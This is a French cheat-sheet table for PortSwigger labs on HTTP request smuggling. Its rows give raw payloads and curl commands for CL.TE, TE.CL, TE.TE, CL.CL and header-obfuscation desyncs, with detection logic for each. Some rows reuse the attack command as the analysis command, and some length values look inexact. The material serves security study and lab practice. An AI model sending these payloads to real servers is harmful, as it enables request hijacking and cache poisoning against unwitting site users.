# Smuggling

Voici un tableau synthétique pour l’**analyse préalable d’une vulnérabilité HTTP request smuggling** sur les labs PortSwigger, intégrant :

- Type/lab
- Exemple de payload d’attaque
- Commande d’attaque (curl)
- Commande(s) d’analyse curl (timing, différentiel, ambiguïté…)
- Élément d’analyse (raison préalable technique)
- **Méthodologie de découverte du type de faille exploitée** (comment identifier la désynchronisation ou la faille, outils, logique)
- URL PortSwigger

---

| # | Type / Lab | Payload d’attaque | Commande d’attaque (curl) | Commande(s) d’analyse curl | Élément d’analyse (raison préalable) | Méthodologie de découverte du type de faille exploitée | URL |
|---|------------|-------------------|---------------------------|----------------------------|--------------------------------------|--------------------------------------------------------|-----|
| 1 | CL.TE (timing) | `POST / HTTP/1.1\nHost: LAB\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA\n0` | `curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" --data-binary $'1\r\nA\r\n0'` | `curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" --data-binary $'1\r\nA\r\n0'` | Si la connexion reste ouverte ou timeout, parsing désynchronisé (le backend attend la suite du body) | Envoi d’une requête incomplète : si la connexion reste ouverte, le backend attend plus de données ; cela indique une désynchronisation CL.TE (front-end lit Content-Length, back-end Transfer-Encoding)[1][5]. | https://portswigger.net/web-security/request-smuggling/finding |
| 2 | TE.CL (timing) | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding: chunked\nContent-Length: 6\n\n0\n\nX` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nX'` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nX'` | Si la connexion reste ouverte ou timeout, parsing désynchronisé | Envoi d’une requête incomplète : si la connexion reste ouverte, le backend attend plus de données ; cela indique une désynchronisation TE.CL (front-end lit Transfer-Encoding, back-end Content-Length)[1][5]. | https://portswigger.net/web-security/request-smuggling/finding |
| 3 | CL.TE (différentiel) | `POST / HTTP/1.1\nHost: LAB\nContent-Length: 49\nTransfer-Encoding: chunked\n\ne\nq=smuggling&x=\n0\nGET /404 HTTP/1.1\nFoo: x` | `curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 49" -H "Transfer-Encoding: chunked" --data-binary $'e\r\nq=smuggling&x=\r\n0\r\nGET /404 HTTP/1.1\r\nFoo: x\r\n\r\n'` | `curl -v https://LAB/ -H "Host: LAB" -d "q=smuggling"` | Si la 2e requête reçoit une réponse 404 ou inattendue, la smuggled request a été traitée | Envoi d’une attaque suivie d’une requête normale. Si la réponse à la 2e diffère (statut, headers…), le backend a traité la requête injectée : différentiel de parsing, typique CL.TE[1][5]. | https://portswigger.net/web-security/request-smuggling/finding |
| 4 | TE.CL (différentiel) | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding: chunked\nContent-Length: 6\n\n0\n\nX` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nX'` | `curl -v https://LAB/ -H "Host: LAB" -d "q=smuggling"` | Si la 2e requête reçoit une réponse inattendue ou cassée, vulnérabilité confirmée | Même logique : injection suivie d’une requête normale : si la réponse change, désynchronisation TE.CL détectée[1][5]. | https://portswigger.net/web-security/request-smuggling/finding |
| 5 | CL.TE (interférence client) | `POST / HTTP/1.1\nHost: LAB\nContent-Length: 30\nTransfer-Encoding: chunked\n\n0\nGET /404 HTTP/1.1\nFoo: x` | `curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 30" -H "Transfer-Encoding: chunked" --data-binary $'0\r\nGET /404 HTTP/1.1\r\nFoo: x\r\n\r\n'` | `curl -v https://LAB/` | Si la réponse de la 2e requête est cassée (404, headers inattendus), vulnérabilité confirmée | Injection d’une requête malformée puis d’une requête normale : si la réponse de la 2e est anormale, il y a interférence (désynchronisation)[1][2]. | https://hacktricks.boitatech.com.br/pentesting-web/http-request-smuggling |
| 6 | TE.CL (interférence client) | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding: chunked\nContent-Length: 6\n\n0\n\nX` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nX'` | `curl -v https://LAB/` | Si la réponse de la 2e requête est cassée, vulnérabilité confirmée | Injection d’une requête malformée puis d’une requête normale : si la réponse de la 2e est anormale, il y a interférence (désynchronisation)[1][2]. | https://hacktricks.boitatech.com.br/pentesting-web/http-request-smuggling |
| 7 | TE.TE (obfuscation) | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding : chunked\nContent-Length: 6\n\n0\n\nG` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding : chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nG'` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nG'` | Si la réponse change selon la syntaxe du header, parsing différentiel | Fuzzing des variantes d’en-têtes (espaces, doubles TE, etc.) et comparaison des réponses pour détecter un parsing ambigu (TE.TE)[1][5]. | https://hacktricks.boitatech.com.br/pentesting-web/http-request-smuggling |
| 8 | CL.CL (ambiguïté) | `POST / HTTP/1.1\nHost: LAB\nContent-Length: 13\nContent-Length: 6\n\nG` | `curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 13" -H "Content-Length: 6" --data-binary $'G'` | `curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 13" --data-binary $'G'`<br>`curl -v https://LAB/ -H "Host: LAB" -H "Content-Length: 6" --data-binary $'G'` | Si la réponse change selon la valeur, ambiguïté de parsing | Tester chaque valeur de Content-Length séparément et comparer les réponses pour détecter l’ambiguïté CL.CL[1][5]. | https://portswigger.net/web-security/request-smuggling/lab-cl-cl |
| 9 | TE.TE (ambiguïté) | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding: chunked\nTransfer-Encoding: identity\n\n0\n\nG` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: identity" --data-binary $'0\r\n\r\nG'` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" --data-binary $'0\r\n\r\nG'` | Si la réponse change, parsing ambigu | Tester avec un ou deux headers Transfer-Encoding et comparer les réponses pour identifier l’ambiguïté TE.TE[1][5]. | https://portswigger.net/web-security/request-smuggling/lab-te-te |
| 10 | Header whitespace | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding : chunked\nContent-Length: 6\n\n0\n\nG` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding : chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nG'` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nG'` | Si la réponse change, parsing différentiel | Tester différentes syntaxes d’en-têtes (espaces, tabulations) et observer les différences de parsing[1][5]. | https://portswigger.net/web-security/request-smuggling/lab-obfuscated-te-header |
| 11 | Header whitespace after colon | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding:  chunked\nContent-Length: 6\n\n0\n\nG` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding:  chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nG'` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" -H "Content-Length: 6" --data-binary $'0\r\n\r\nG'` | Si la réponse change, parsing différentiel | Tester la présence/absence d’espace après le deux-points et comparer les réponses pour détecter un parsing ambigu[1][5]. | https://portswigger.net/web-security/request-smuggling/lab-whitespace-after-colon |
| 12 | Chunked encoding, chunk size invalide | `POST / HTTP/1.1\nHost: LAB\nTransfer-Encoding: chunked\n\nz\nhello\n0\n\nG` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" --data-binary $'z\r\nhello\r\n0\r\n\r\nG'` | `curl -v https://LAB/ -H "Host: LAB" -H "Transfer-Encoding: chunked" --data-binary $'5\r\nhello\r\n0\r\n\r\nG'` | Si la réponse change, certains serveurs tolèrent chunk size non standard | Tester chunk size valide puis invalide et comparer les réponses pour détecter une tolérance anormale[1][5]. | https://portswigger.net/web-security/request-smuggling/lab-chunked-invalid-size |

---

